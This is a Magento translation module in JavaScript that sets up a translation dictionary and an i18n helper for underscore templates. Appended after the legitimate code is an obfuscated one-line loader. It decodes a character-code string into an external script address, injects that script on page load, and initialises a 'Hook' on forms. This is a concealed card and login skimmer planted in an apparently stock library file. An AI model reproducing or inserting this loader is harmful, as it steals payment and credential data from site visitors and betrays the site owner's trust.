/**
 * Copyright © Magento, Inc. All rights reserved.
 * See COPYING.txt for license details.
 */

define([
    'jquery',
    'mage/mage',
    'mageTranslationDictionary',
    'underscore'
], function ($, mage, dictionary, _) {
    'use strict';

    $.extend(true, $, {
        mage: {
            translate: (function () {
                /**
                 * Key-value translations storage
                 * @type {Object}
                 * @private
                 */
                var _data = dictionary;

                return {
                    /**
                     * Add new translation (two string parameters) or several translations (object)
                     */
                    add: function () {
                        if (arguments.length > 1) {
                            _data[arguments[0]] = arguments[1];
                        } else if (typeof arguments[0] === 'object') {
                            $.extend(_data, arguments[0]);
                        }
                    },

                    /**
                     * Make a translation with parsing (to handle case when _data represents tuple)
                     * @param {String} text
                     * @return {String}
                     */
                    translate: function (text) {
                        return typeof _data[text] !== 'undefined' ? _data[text] : text;
                    }
                };
            }())
        }
    });
    $.mage.__ = $.proxy($.mage.translate.translate, $.mage.translate);

    // Provide i18n wrapper to be used in underscore templates for translation
    _.extend(_, {
        /**
         * Make a translation using $.mage.__
         *
         * @param {String} text
         * @return {String}
         */
        i18n: function (text) {
            return $.mage.__(text);
        }
    });

    return $.mage.__;
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b